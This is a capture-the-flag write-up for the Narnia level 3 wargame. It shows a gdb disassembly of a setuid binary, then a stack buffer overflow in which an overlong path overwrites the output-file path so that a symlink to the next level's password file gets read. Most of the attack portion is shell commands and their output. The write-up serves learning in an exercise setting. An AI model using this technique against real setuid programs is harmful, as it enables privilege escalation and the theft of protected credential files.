The source code for this next binary at first looks very complicated but again this is just a buffer overflow vulnerability again. The overflow occurs in the ifile buffer where a long file name can overwrite the ofile file.

```
narnia3@melinda:~$ gdb -q /narnia/narnia3
Reading symbols from /games/narnia/narnia3...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
0x080484d4 <+0>:     push   %ebp
0x080484d5 <+1>:     mov    %esp,%ebp
0x080484d7 <+3>:     and    $0xfffffff0,%esp
0x080484da <+6>:     sub    $0x70,%esp
0x080484dd <+9>:     movl   $0x7665642f,0x58(%esp)    ;ofile /dev
0x080484e5 <+17>:    movl   $0x6c756e2f,0x5c(%esp)    ;ofile /nul
0x080484ed <+25>:    movl   $0x6c,0x60(%esp)            ;ofile l
0x080484f5 <+33>:    movl   $0x0,0x64(%esp)            ;ofile \0
0x080484fd <+41>:    cmpl   $0x2,0x8(%ebp)
0x08048501 <+45>:    je     0x8048525 <main+81>
0x08048503 <+47>:    mov    0xc(%ebp),%eax
0x08048506 <+50>:    mov    (%eax),%edx
0x08048508 <+52>:    mov    $0x8048710,%eax
0x0804850d <+57>:    mov    %edx,0x4(%esp)
0x08048511 <+61>:    mov    %eax,(%esp)
0x08048514 <+64>:    call   0x80483a0 <printf@plt>
0x08048519 <+69>:    movl   $0xffffffff,(%esp)
0x08048520 <+76>:    call   0x80483d0 <exit@plt>
0x08048525 <+81>:    mov    0xc(%ebp),%eax
0x08048528 <+84>:    add    $0x4,%eax
0x0804852b <+87>:    mov    (%eax),%eax
0x0804852d <+89>:    mov    %eax,0x4(%esp)
0x08048531 <+93>:    lea    0x38(%esp),%eax            ;ifile
....
```

As I showed in the disassemble of the main function in gdb, the ofile is begins to be defined at 0x58 and ifile is at 0x38 which is a length of 32 bytes in length. Since the input for ifile is copied from the user input into the ifile with the strcpy() which does not perform any checks of the length of the input. This means if I give a file name of more then 32 bytes in length I can overwrite the ofile file from /dev/null to whatever I would like.

To begin with I create a file in the /tmp directory called “nsimattstiles” which is where I want the password for the next level to end up, and then made the file world readable and then made a directory within the /tmp directory of called “bbbbbbbbbbbbbbbbbbbbbbbbbbb” which is 27 b’s and then inside that directory I created another directory called /tmp. The entire length of the file name called
```
narnia3@melinda:/tmp$ touch /tmp/nsimattstiles
narnia3@melinda:/tmp$ chmod 777 /tmp/nsimattstiles
narnia3@melinda:/tmp$ cd ./$(python -c'print "b"*27')
narnia3@melinda:/tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbb$ cd ./tmp
narnia3@melinda:~$ python -c'print(len("/tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbb"))'
32
```
So as you can see in the command outputs above is that the directory name of “/tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbb” is 32 bytes in length which means the directory called “/tmp” within the “/tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbb” will begin to overwrite the ofile if passed to the binary. The next step was to link the “/tmp/nsimattstiles” file with the password file using the link command in linux, this means when the nsimattstiles files is cat the file actual cats out the contents of the password file “/etc/narnia_pass/narnia4”.

```
narnia3@melinda:/tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbb/tmp$ ln -s /etc/narnia_pass/narnia4 ./nsimattstiles
narnia3@melinda:/tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbb/tmp$ ls -lh
total 0
lrwxrwxrwx 1 narnia3 narnia3 24 Nov 12 07:50 nsimattstiles -> /etc/narnia_pass/narnia4
The next step is just to pass the binary the long filename for the ifile buffer and then cat out my password file.

```
narnia3@melinda:/tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbb/tmp$ /narnia/narnia3 $(python -c'print "/tmp/" + "b"*27 + "/tmp/nsimattstiles"')
copied contents of /tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbb/tmp/nsimattstil to a safer place... (/tmp/nsimattstil)
narnia3@melinda:/tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbb/tmp$ cat /tmp/nsimattstiles
**********
ÿ/Üÿÿô`narnia3@melinda:/tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbb/tmp/tmp$
```
